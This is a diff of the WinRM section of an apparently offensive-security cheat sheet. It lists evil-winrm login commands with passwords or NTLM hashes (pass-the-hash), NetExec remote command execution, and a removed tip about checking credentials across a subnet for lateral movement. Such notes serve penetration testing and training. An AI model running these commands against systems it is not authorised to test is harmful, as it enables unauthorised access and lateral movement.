@@ -5396,13 +5396,13 @@
 <h1 id="winrm-5985-5986">WinRM (5985, 5986)<a class="headerlink" href="#winrm-5985-5986" title="Permanent link">&para;</a></h1>
 <div class="admonition tip">
 <p class="admonition-title">Start here</p>
-<p>With valid credentials, connect directly: <code>evil-winrm -i $IP -u &lt;user&gt; -p &lt;pass&gt;</code>. Pass-the-hash also works: <code>evil-winrm -i $IP -u &lt;user&gt; -H &lt;ntlm-hash&gt;</code>. Port 5985 is HTTP, 5986 is HTTPS. Check both.</p>
+<p>WinRM is normally useful after obtaining valid credentials. Validate the account with NetExec, then use Evil-WinRM when an interactive PowerShell session is needed. Port 5985 is HTTP and 5986 is HTTPS.</p>
 </div>
 <hr />
 <h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">5985</span>,5986<span class="w"> </span><span class="nv">$IP</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$IP</span>
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>curl<span class="w"> </span>-sk<span class="w"> </span>http://<span class="nv">$IP</span>:5985/wsman
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>curl<span class="w"> </span>-sk<span class="w"> </span>http://<span class="nv">$IP</span>:5985/wsman
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>curl<span class="w"> </span>-sk<span class="w"> </span>https://<span class="nv">$IP</span>:5986/wsman
 </code></pre></div>
 <hr />
 <h2 id="brute-force">Brute Force<a class="headerlink" href="#brute-force" title="Permanent link">&para;</a></h2>
@@ -5410,8 +5410,9 @@
 </code></pre></div>
 <hr />
 <h2 id="shell-via-evil-winrm">Shell via evil-winrm<a class="headerlink" href="#shell-via-evil-winrm" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;pass&gt;
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-H<span class="w"> </span>&lt;ntlm-hash&gt;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USERNAME</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USERNAME</span><span class="s2">&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NTLM_HASH</span><span class="s2">&quot;</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-P<span class="w"> </span><span class="m">5986</span><span class="w"> </span>-S<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USERNAME</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span>
 </code></pre></div>
 <p>Upload/download files from within the shell:</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>*Evil-WinRM* PS&gt; upload /path/to/local/file C:\destination
@@ -5419,13 +5420,9 @@
 </code></pre></div>
 <hr />
 <h2 id="remote-command-execution">Remote Command Execution<a class="headerlink" href="#remote-command-execution" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;pass&gt;<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-H<span class="w"> </span>&lt;ntlm-hash&gt;<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;ipconfig&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USERNAME</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USERNAME</span><span class="s2">&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NTLM_HASH</span><span class="s2">&quot;</span><span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;ipconfig&quot;</span>
 </code></pre></div>
-<div class="admonition tip">
-<p class="admonition-title">Real-world</p>
-<p>WinRM is enabled by default on Windows Server 2012+ and is commonly used for legitimate remote management. If you have valid domain credentials, always check if they work on WinRM across the entire subnet, <code>nxc winrm $SUBNET -u &lt;user&gt; -p &lt;pass&gt;</code> is a fast lateral movement check.</p>
-</div>
 
 
 
